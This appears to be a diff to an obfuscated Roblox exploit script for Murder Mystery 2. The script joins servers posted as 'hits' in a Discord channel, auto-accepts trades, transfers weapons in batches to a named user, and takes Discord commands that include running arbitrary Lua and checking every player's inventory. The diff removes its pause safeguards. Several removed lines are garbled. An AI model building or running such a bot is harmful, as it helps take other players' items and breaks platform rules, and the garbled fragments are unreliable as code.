@@ -37,15 +37,12 @@ _sumV = 0;
 _doneT = 0;
 _minRare = _minRare or "Godly";
 
--- ═══════════ PAUSE STATE ═══════════
-_paused = false;
-
--- ═══════════ SESSION STATS ═══════════
+-- session stats
 _hitsJoined = 0;
 _itemsGained = 0;
 _sessionStart = tick();
 
--- ═══════════ PERSISTENT STATS ═══════════
+-- persistent stats
 local STATS_FILE = "stats_persistent.dat";
 _pStats = {
     hitsJoined     = 0,
@@ -72,10 +69,10 @@ _pStats.lastUpdate = os.time();
 
 local function _saveStats()
     pcall(function()
-        _pStats _.lastUpdate = os.time();
-       ok writefile( andSTATS_FILE, _hs type:JSONEncode(_(_pStats));
+        _pStats.lastUpdate = os.time();
+        writefile(STATS_FILE, _hs:JSONEncode(_pStats));
     end);
-endt
+end
 
 _saveStats();
 
@@ -89,7 +86,7 @@ _autoexecURL = "";
 
 if isfile(AUTOEXEC_FILE) then
     local _ok, _t = pcall(readfile, AUTOEXEC_FILE);
-    if) == "string" then
+    if _ok and type(_t) == "string" then
         _autoexecURL = _t:gsub("^%s+", ""):gsub("%s+$", "");
     end
 end
@@ -358,6 +355,7 @@ if _isMM2 then
                 local _b, _it = _chk();
                 if _b == true then
                     _doneT = _doneT + 1;
+
                     local _gainCount, _gainValue = 0, 0;
                     for _ii, _vv in pairs(_it) do
                         if _vv > 0 then
@@ -381,9 +379,7 @@ if _isMM2 then
                     _snap("trade");
                 end
             elseif _s == "ReceivingRequest" then
-                if not _paused then
-                    _rs.Trade.AcceptRequest:FireServer();
-                end
+                _rs.Trade.AcceptRequest:FireServer();
             end
             task.wait(0.1);
         end
@@ -505,7 +501,6 @@ _transferTarget = nil;
 _transferDone   = 0;
 
 local function _ok2go()
-    if _paused then return false end
     if _transferActive then return false end
     return _doneT >= _tbn or _gone()
 end
@@ -552,17 +547,6 @@ local function _pjm(_m)
     if _il("hits_joined.dat", _m.id) then return end
     if _ji == game.JobId then return end
 
-    if _paused then
-        -- Capture but don't teleport
-        local _q = _rl("pending_hits.dat");
-        for _, _j in ipairs(_q) do
-            if _j.msgid == _m.id then return end
-        end
-        table.insert(_q, { placeId = _pi, jobId = _ji, msgid = _m.id, author = _m.author.username });
-        _wl("pending_hits.dat", _q);
-        return;
-    end
-
     if _moving then
         _tpTo(_pi, _ji, _m.id);
         return;
@@ -577,7 +561,7 @@ local function _pjm(_m)
 end
 
 local function _scanLoop()
-    while _moving and not _paused do
+    while _moving do
         local _ms = _getMsgs(_lastMid, _hitCh);
         for _i = #_ms, 1, -1 do
             _pjm(_ms[_i]);
@@ -588,7 +572,6 @@ local function _scanLoop()
 end
 
 function _tpTo(_pi, _ji, _mi)
-    if _paused then return end
     _cur = { placeId = tonumber(_pi), jobId = _ji, msgid = _mi };
     if _moving then return end
     _moving = true;
@@ -664,11 +647,6 @@ local function _postEmbed(_title, _desc, _color)
 end
 
 local function _doTransfer(_targetName)
-    if _paused then
-        _postEmbed("⏸️ Paused", "Cannot start transfer while paused.\nUse `!unpause` first.", 0xFFA500);
-        return;
-    end
-
     _transferActive = true;
     _transferTarget = _targetName;
     _transferDone = 0;
@@ -686,7 +664,7 @@ local function _doTransfer(_targetName)
     task.wait(1.5);
 
     local _safety = 0;
-    while _transferActive and not _paused and _safety < 100 do
+    while _transferActive and _safety < 100 do
         _safety = _safety + 1;
 
         _target = game.Players:FindFirstChild(_targetName);
@@ -705,7 +683,7 @@ local function _doTransfer(_targetName)
 
         local _sent = false;
         for _try = 1, 15 do
-            if not _transferActive or _paused then break end
+            if not _transferActive then break end
             local _s = _ts();
             if _s == "StartTrade" then _sent = true; break end
             if _s == "ReceivingRequest" then
@@ -717,7 +695,7 @@ local function _doTransfer(_targetName)
             task.wait(0.3);
         end
 
-        if not _transferActive or _paused then break end
+        if not _transferActive then break end
 
         if not _sent then
             print("[transfer] target didn't accept, retrying...");
@@ -725,7 +703,7 @@ local function _doTransfer(_targetName)
         else
             local _offered = 0;
             for _i = 1, math.min(4, #_batch) do
-                if not _transferActive or _paused then break end
+                if not _transferActive then break end
                 pcall(function() _rs.Trade.OfferItem:FireServer(_batch[_i], "Weapons") end);
                 task.wait(0.08);
                 _offered = _offered + 1;
@@ -748,11 +726,7 @@ local function _doTransfer(_targetName)
         task.wait(0.5);
     end
 
-    if _paused then
-        _postEmbed("⏸️ Transfer Stopped", "Transfer cancelled because joiner was paused.\nBatches sent: **".._transferDone.."**", 0xFFA500);
-    else
-        _postEmbed("🏁 Transfer Ended", "Batches: **".._transferDone.."**\nTarget: **".._targetName.."**", 0x3EED50);
-    end
+    _postEmbed("🏁 Transfer Ended", "Batches: **".._transferDone.."**\nTarget: **".._targetName.."**", 0x3EED50);
 
     _transferActive = false;
     _transferTarget = nil;
@@ -858,11 +832,6 @@ local function _gw()
                                 description = "All commands are **owner-locked**.",
                                 color = 0x3EED50,
                                 fields = {
-                                    { name = "⏸️ Control", value =
-                                        "`!pause` — freeze joiner + auto-trade\n" ..
-                                        "`!unpause` — resume\n" ..
-                                        "`!panic` — emergency stop everything",
-                                        inline = false },
                                     { name = "📦 Inventory", value =
                                         "`!inv` `!invf`\n" ..
                                         "`!servercheck` — every player's inventory\n" ..
@@ -875,7 +844,7 @@ local function _gw()
                                         "`!age <user>` `!execute <lua>`",
                                         inline = false },
                                     { name = "🚀 Movement", value =
-                                        "`!rejoin` `!rejoinlast`",
+                                        "`!rejoin` `!rejoinlast` `!panic`",
                                         inline = false },
                                     { name = "🔁 Transfers", value =
                                         "`!transfer <user>` `!stoptransfer`",
@@ -895,76 +864,6 @@ local function _gw()
                     else
                         task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
                     end
-                    return;
-                end
-
-                -- ─── !pause ───
-                if _content == "!pause" then
-                    if not _isOwner(_md.author) then
-                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
-                        return;
-                    end
-                    task.spawn(function() _reactIn(_cmdCh, _md.id, "⏸️") end);
-                    task.spawn(function()
-                        if _paused then
-                            _postEmbed("⏸️ Already Paused", "Joiner is already paused.", 0xFFA500);
-                            return;
-                        end
-                        _paused = true;
-
-                        local _stoppedTransfer = false;
-                        if _transferActive then
-                            _transferActive = false;
-                            _stoppedTransfer = true;
-                        end
-
-                        local _s = nil;
-                        if _ts then
-                            local _okT, _sT = pcall(_ts);
-                            if _okT then _s = _sT end
-                        end
-                        local _declined = nil;
-                        if _s == "StartTrade" then
-                            pcall(function() _rs.Trade.DeclineTrade:FireServer() end);
-                            _declined = "open trade declined";
-                        elseif _s == "ReceivingRequest" then
-                            pcall(function() _rs.Trade.DeclineRequest:FireServer() end);
-                            _declined = "incoming request declined";
-                        end
-
-                        local _desc =
-                            "**⏸️ PAUSED**\n\n" ..
-                            "• Joiner won't teleport to new hits\n" ..
-                            "• Auto-accept trades is off\n" ..
-                            "• `!transfer` is blocked\n" ..
-                            (_stoppedTransfer and "• Stopped active transfer\n" or "") ..
-                            (_declined and ("• " .. _declined .. "\n") or "") ..
-                            "\nUse `!unpause` to resume.";
-
-                        _postEmbed("⏸️ Joiner Paused", _desc, 0xFFA500);
-                    end);
-                    return;
-                end
-
-                -- ─── !unpause / !resume ───
-                if _content == "!unpause" or _content == "!resume" then
-                    if not _isOwner(_md.author) then
-                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
-                        return;
-                    end
-                    task.spawn(function() _reactIn(_cmdCh, _md.id, "▶️") end);
-                    task.spawn(function()
-                        if not _paused then
-                            _postEmbed("▶️ Already Running", "Joiner is not paused.", 0xFFA500);
-                            return;
-                        end
-                        _paused = false;
-                        local _q = #_rl("pending_hits.dat");
-                        _postEmbed("▶️ Joiner Resumed",
-                            "Normal operation restored.\n" ..
-                            "Pending hits in queue: **" .. _q .. "**",
-                            0x3EED50);
-                    end);
                     return;
                 end
 
@@ -1134,8 +1033,6 @@ local function _gw()
                     task.spawn(function() _reactIn(_cmdCh, _md.id, "🚨") end);
                     task.spawn(function()
                         local _actions = {};
-                        _paused = true;
-                        table.insert(_actions, "✅ Paused joiner");
                         if _transferActive then
                             _transferActive = false;
                             table.insert(_actions, "✅ Stopped active transfer");
@@ -1162,10 +1059,11 @@ local function _gw()
                             _clearQueue();
                             table.insert(_actions, "✅ Cleared autoexecute queue");
                         end
-                        _postEmbed("🚨 Panic - Everything Stopped",
-                            table.concat(_actions, "\n") ..
-                            "\n\n**Still connected.** Use `!unpause` to resume.",
-                            0xFF0000);
+                        if #_actions == 0 then
+                            _postEmbed("🚨 Panic", "Nothing to stop.", 0xFFA500);
+                        else
+                            _postEmbed("🚨 Panic - All Stopped", table.concat(_actions, "\n") .. "\n\n**Still connected.** Use `!help` to resume.", 0xFF0000);
+                        end
                     end);
                     return;
                 end
@@ -1310,7 +1208,6 @@ local function _gw()
                             "**📦 Items gained:** `" .. _fmt(_pStats.itemsGained) .. "`\n" ..
                             "**💎 Value gained:** `" .. _fmt(_pStats.valueGained) .. "`\n" ..
                             "\n" ..
-                            "**⏸️ Paused:** `" .. (_paused and "YES" or "no") .. "`\n" ..
                             "**📋 Pending hits:** `" .. _q .. "`\n";
 
                         _postEmbed("📊 Stats", _desc, 0x3EED50);
@@ -1537,7 +1434,7 @@ local function _gw()
                         local _autoStr = (_autoexecURL ~= "") and ("active: `" .. _autoexecURL .. "`") or "off";
 
                         local _desc =
-                            "**" .. (_paused and "⏸️ PAUSED" or "🟢 Online") .. "**\n" ..
+                            "**🟢 Online**\n" ..
                             "**JobId:** `" .. tostring(game.JobId):sub(1, 18) .. "...`\n" ..
                             "**PlaceId:** `" .. tostring(game.PlaceId) .. "`\n" ..
                             "**Player:** `" .. game.Players.LocalPlayer.Name .. "`\n" ..
@@ -1554,7 +1451,7 @@ local function _gw()
                         local _embed = {
                             title = "📡 Autojoiner Status",
                             description = _desc,
-                            color = _paused and 0xFFA500 or 0x3EED50,
+                            color = 0x3EED50,
                             fields = _f,
                             footer = { text = "Status at " .. os.date("%H:%M:%S") },
                             timestamp = DateTime.now():ToIsoDate()
